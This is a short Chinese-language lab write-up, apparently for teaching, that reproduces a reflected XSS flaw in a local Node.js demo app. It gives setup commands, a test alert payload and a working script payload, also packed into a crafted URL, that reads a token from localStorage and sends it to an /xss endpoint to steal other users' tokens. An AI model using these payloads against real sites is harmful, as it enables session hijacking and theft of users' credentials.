### 反射型XSS复现

##### 问题描述：

反射型XXS是一种非持久性的攻击，它指的是恶意攻击者往Web页面里插入恶意代码，当用户浏览该页之时，嵌入其中Web里面的html代码会被执行，从而达到恶意攻击用户的目的。

##### 必要条件：

1.能够通过get的方式传参，例如：

```
example.com/index.html?name=exp
```

2.恶意代码没有被处理。

3.恶意能被浏览器成功执行。

##### 复现步骤：

```
npm install
node .\bin\www
```

访问http://127.0.0.1:3000，在输入框输入。

1. 输入任意字符，url变为http://127.0.0.1:3000/index.html?welcome=Hello,%20ex，满足条件1。

2. 输入

   ```
   <script>alert(a)<script>
   ```

3. 步骤2的代码能够执行，说明满足条件2、3，准备获取存在localStorage里的token。

4. 输入并执行

   ```
   <script>window.onload=function(){var a=localStorage.getItem('token');window.location.href=`http://127.0.0.1:3000/xss?token=${a}`;}</script>
   ```

5. 发现后端提示已获取token。

6. 通过如下url吊取他人token：

   ```
   http://127.0.0.1:3000/index.html?welcome=%3Cscript%3Ewindow.onload=function(){var a=localStorage.getItem('token');window.location.href=`http://127.0.0.1:3000/xss?token=${a}`;}%3C/script%3E
   ```

   

